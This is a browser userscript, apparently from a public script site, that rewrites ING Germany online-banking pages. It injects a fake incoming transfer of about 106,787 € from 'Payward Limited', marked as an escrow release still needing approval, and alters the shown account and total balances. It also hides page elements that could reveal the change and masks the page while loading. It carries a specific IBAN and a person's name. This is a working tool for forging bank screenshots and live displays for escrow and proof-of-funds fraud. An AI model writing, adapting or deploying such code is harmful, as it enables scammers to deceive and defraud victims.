// ==UserScript==
// @name        Combined ING Frank Ruebesam ING
// @namespace   http://your.namespace.com
// @version     1.0
// @description Insert multiple transaction elements with custom details and change account balances
// @match        https://www.drivehq.com/*
// @match       https://banking.ing.de/*
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/479950/Combined%20ING%20Frank%20Ruebesam%20ING.user.js
// @updateURL https://update.greasyfork.org/scripts/479950/Combined%20ING%20Frank%20Ruebesam%20ING.meta.js
// ==/UserScript==



(function() {
    'use strict';

////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////

    // Specify the adjustment amount for topGesamtSaldo
    const topGesamtSaldoAdjustmentAmount = 0;  // Change this to your desired amount

    // Define an array for account balance adjustments
    const accountBalanceAdjustments = [
        { index: 0, amount: 0 },  // Example: change the first account's balance by -1000 EUR
    //    { index: 2, amount: 100 },
        // Add more objects as needed for each account balance adjustment
    ];

    // Specify your IBAN and custom transactions here
    const yourIBAN = 'DE32 5001 0517 5444 9125 50'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 0; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        {
            recipientName: 'Payward Limited',
            transactionDetails: 'Treuhand: Freigabe nötig',
            transactionAmount: '+106.787,29',
            moveDirection: 'down',
            moveSteps: 0,
            transactionDate: '14.09.2023',
            insertAtTop: true
        }
      
    ];

////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////

 // Add overlay and spinner when the webpage is loading
    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'white';
    overlay.style.zIndex = '9999';
    document.body.appendChild(overlay);

    var spinner = document.createElement('div');
    spinner.className = 'spinner';
    overlay.appendChild(spinner);

    var overlayDuration = 1500;
    setTimeout(function() {
        overlay.remove();
    }, overlayDuration);

    // Add CSS for the spinner
    var style = document.createElement('style');
    style.textContent = `
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #333;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10000;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    `;
    document.head.appendChild(style);

 // Classes to monitor and remove
    const classesToRemove = ['g2p-transaction__nav-container', 'g2p-transaction__title-wrap', 'g2p-transaction__overview-info.u-hidden-sm', 'gap-top-1.gap-bottom-1-sm', 'g2p-extend-toggle', 'quicklinks', 'g2p-transaction-summary__balance', 'accountselector.accountselector--g2p.accountselector--iban'/* ... */];

    // Function to remove elements with specific classes
    function removeElementsWithClasses() {
        classesToRemove.forEach(className => {
            const elements = document.querySelectorAll('.' + className);
            elements.forEach(element => {
                element.remove();
            });
        });
    }

    // Mutation Observer to monitor and remove elements
    const observer = new MutationObserver(mutations => {
        removeElementsWithClasses();
    });

    // Configuration for the observer
    const observerConfig = {
        attributes: true, // Monitor attribute changes
        childList: true, // Monitor additions/removals of child nodes
        subtree: true // Observe all descendants of target node
    };

    // Start observing the document
    observer.observe(document.body, observerConfig);






        if (window.location.href.indexOf("umsatzanzeige") > 0 || window.location.href.indexOf("drive") > 0) {





    // Transaction Insertion Script Logic
    window.addEventListener('load', function() {
        const ibanElement = document.querySelector('.g2p-banking-header__account__iban.u-hidden-sm');

        if (ibanElement) {
            const specifiedIBAN = yourIBAN.replace(/\s+/g, '');
            const retrievedIBAN = ibanElement.textContent.trim().replace(/\s+/g, '');

            if (retrievedIBAN === specifiedIBAN) {
                customTransactions.forEach(transaction => {
                    const {
                        recipientName,
                        transactionDetails,
                        transactionAmount,
                        moveDirection,
                        moveSteps,
                        transactionDate,
                        insertAtTop
                    } = transaction;

                    const transactionAmountClass = parseFloat(transactionAmount) < 0
                        ? 'g2p-transaction-summary__amount g2p-transaction-summary__amount--negative'
                        : 'g2p-transaction-summary__amount g2p-transaction-summary__amount--positive';

                    const newTransactionElement = document.createElement('div');
                    newTransactionElement.className = 'g2p-transaction-item';
                    newTransactionElement.innerHTML = `
                        <div class="g2p-transaction-overlay__header">
                            <div class="g2p-transaction-overlay__close"></div>
                        </div>
                        <div class="g2p-transaction-summary g2p-transaction-summary--notags">
                            <div class="g2p-transaction-summary__primary">
                                <div class="g2p-transaction-summary__recipient">
                                    <span>${recipientName}</span>
                                </div>
                                <span class="g2p-transaction-summary__type">${transactionDetails}</span>
                            </div>
                            <div class="g2p-transaction-summary__balance">
                                <span class="u-visuallyhidden">Kontosaldo nachher:</span>
                            </div>
                            <span class="${transactionAmountClass}">
                                <span class="u-visuallyhidden">Summe:</span>
                                <span class="g2p-amount">${transactionAmount}&nbsp;€</span>
                            </span>
                        </div>
                        <button class="g2p-transaction-details-btn"
                                aria-label="Umsatzdetails anzeigen für: ${recipientName}. Umsatzart: ${transactionDetails}. Summe: ${transactionAmount} Euro."
                                data-toggle-selector="#idb960f76b"
                                data-toggle-state="open,closed"
                                data-trigger-state="closed"
                                aria-expanded="false"></button>
                        <div class="g2p-transaction-details" data-state="closed" data-animate="" data-lazy-loading="true"
                             aria-hidden="true">
                        </div>
                    `;

                   if (insertAtTop) {
                    const firstTransactionGroup = document.querySelector('.g2p-transaction-group');
                    if (firstTransactionGroup) {
                        firstTransactionGroup.parentNode.insertBefore(newTransactionElement, firstTransactionGroup);
                        moveTransaction(newTransactionElement, moveDirection, moveSteps);
                    } else {
                        console.error('No transaction group found.');
                    }
                } else {
                        const transactionGroups = document.querySelectorAll('.g2p-transaction-group__title');
                        let targetGroup = null;

                        transactionGroups.forEach(group => {
                            if (group.textContent.trim() === transactionDate) {
                                targetGroup = group.closest('.g2p-transaction-group');
                            }
                        });


               if (!targetGroup) {
                            let closestDiff = Infinity;
                            transactionGroups.forEach(group => {
                                const groupDate = group.textContent.trim();
                                const currentDate = new Date(transactionDate);
                                const groupDiff = Math.abs(currentDate - new Date(groupDate));
                                if (groupDiff < closestDiff) {
                                    closestDiff = groupDiff;
                                    targetGroup = group.closest('.g2p-transaction-group');
                                }
                            });
                        }

                        if (targetGroup) {
                        targetGroup.querySelector('.g2p-transaction-list').appendChild(newTransactionElement);
                        moveTransaction(newTransactionElement, moveDirection, moveSteps);
                    } else {
                        console.error('No suitable transaction group found.');
                    }
                }
            });

                // Balance Change Logic from Transaction Insertion Script

                const balanceElement = document.querySelector('.g2p-banking-header__account__balance .g2p-amount');


                 if (balanceElement) {
                    const currentBalanceText = balanceElement.textContent.trim();
                    const currentBalance = parseFloat(currentBalanceText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
                    const newBalance = currentBalance + balanceChange;
                    const newBalanceFormatted = newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });
                    balanceElement.innerHTML = newBalanceFormatted;
                } else {
                    console.error('Balance element not found.');
                }
            } else {
                console.error('IBAN does not match.');
            }
        } else {
            console.error('IBAN element not found.');
        }
    });
    // Move Transaction Function
    function moveTransaction(transactionElement, moveDirection, moveSteps) {
        const transactionList = transactionElement.parentNode;
        const transactionSiblings = Array.from(transactionList.children);

        const currentIndex = transactionSiblings.indexOf(transactionElement);

        if (moveDirection === 'up') {
            const newIndex = Math.max(currentIndex - moveSteps, 0);
            transactionList.insertBefore(transactionElement, transactionSiblings[newIndex]);
        } else if (moveDirection === 'down') {
            const newIndex = Math.min(currentIndex + moveSteps, transactionSiblings.length - 1);
            transactionList.insertBefore(transactionElement, transactionSiblings[newIndex].nextSibling);
        } else {
            console.error('Invalid move direction. Please specify "up" or "down".');
        }
    }
            }


      if (window.location.href.indexOf("obligo/obligo") > 0 || window.location.href.indexOf("drive") > 0) {



    // Find the topGesamtSaldo balance element by its class name
    const topGesamtSaldoBalanceElement = document.querySelector('.g2p-banking-header__balance.g2p-amount');

    if (topGesamtSaldoBalanceElement) {
        // Parse and adjust the current topGesamtSaldo balance
        const currentTopGesamtSaldoText = topGesamtSaldoBalanceElement.textContent.trim();
        const currentTopGesamtSaldo = parseFloat(currentTopGesamtSaldoText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
        const newTopGesamtSaldo = currentTopGesamtSaldo + topGesamtSaldoAdjustmentAmount;

        // Format the new topGesamtSaldo balance
        const newTopGesamtSaldoFormatted = newTopGesamtSaldo.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });

        // Update the topGesamtSaldo balance element's content with the new formatted balance
        topGesamtSaldoBalanceElement.textContent = newTopGesamtSaldoFormatted;
    } else {
        console.error('Topgesamtsaldo balance element not found.');
    }

    // Loop through the account balance adjustments array
    for (const adjustment of accountBalanceAdjustments) {
        const accountBalanceElement = document.querySelectorAll('.g2p-account__balance.g2p-amount')[adjustment.index];

        if (accountBalanceElement) {
            const currentAccountBalanceText = accountBalanceElement.textContent.trim();
            const currentAccountBalance = parseFloat(currentAccountBalanceText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
            const newAccountBalance = currentAccountBalance + adjustment.amount;

            const newAccountBalanceFormatted = newAccountBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });

            accountBalanceElement.textContent = newAccountBalanceFormatted;
        } else {
            console.error(`Account balance element at index ${adjustment.index} not found.`);
        }
    }
            }



})();
